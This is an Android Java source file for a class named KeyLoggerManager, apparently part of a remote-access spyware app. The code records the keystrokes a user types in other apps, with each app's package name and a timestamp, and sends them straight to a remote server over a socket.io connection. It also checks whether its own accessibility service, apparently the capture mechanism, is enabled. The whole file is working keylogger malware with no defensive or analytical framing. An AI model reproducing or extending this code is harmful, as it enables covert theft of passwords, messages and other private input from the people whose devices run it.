package com.example.keyloggermanager;

import android.content.Context;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

import com.example.commoninterfaces.IOSocket;

import org.json.JSONArray;
import org.json.JSONObject;
import io.socket.client.Socket;

import java.util.List;

public class KeyLoggerManager {
    private static KeyLoggerManager sInstance;
    private static final List<JSONObject> keyLogs = new java.util.ArrayList<>();

    public static KeyLoggerManager getInstance() {
        if (sInstance == null) {
            sInstance = new KeyLoggerManager();
        }
        return sInstance;
    }

    public void logKeystroke(Context context, String appName, String text, long timestamp) {
        try {
            JSONObject keylog = new JSONObject();
            keylog.put("package", appName);
            keylog.put("text", text);
            keylog.put("time", timestamp);
            keyLogs.add(keylog);

            sendKeylogsToServer(IOSocket.getInstance(context).getIoSocket(), context);
            keyLogs.clear(); // Clear after sending
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public JSONObject getKeyLogs(Context context) {
        JSONObject result = new JSONObject();
        JSONArray array = new JSONArray();
        try {
            for (JSONObject log : keyLogs) {
                array.put(log);
            }
            result.put("keylogs", array);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return result;
    }

    public void sendKeylogsToServer(Socket socket, Context context) {
        Log.d("KEYLOGGER_SEND", "Attempting to send keylogs: size = " + keyLogs.size());
        if (socket == null || !socket.connected()) {
            Log.e("KEYLOGGER_SEND", "Socket is null or not connected");
            return;
        }
        JSONObject logs = getKeyLogs(context);
        if (logs != null && logs.has("keylogs")) {
            Log.d("KEYLOGGER_SEND", "Sending logs: " + logs.toString());
            socket.emit("0xKL", logs);
        }
    }

    public boolean isAccessibilityEnabled(Context context) {
        int accessibilityEnabled = 0;
        final String service = context.getPackageName() + "/com.example.keyloggermanager.KeyLoggerService";
        try {
            accessibilityEnabled = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }

        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                colonSplitter.setString(settingValue);
                while (colonSplitter.hasNext()) {
                    if (colonSplitter.next().equalsIgnoreCase(service)) {
                        return true;
                    }
                }
            }
        }
        return false;
    }
}
